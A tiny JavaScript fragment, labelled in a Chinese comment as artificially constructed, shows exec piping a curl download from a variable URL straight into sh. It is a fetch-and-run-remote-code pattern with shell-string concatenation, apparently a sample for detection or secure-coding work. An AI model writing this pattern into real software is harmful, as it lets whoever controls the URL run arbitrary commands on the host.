// 出处:人工构造(exec 管道执行远端脚本)
exec('curl -s ' + artifactUrl + ' | sh', { timeout: 5000 }, cb);
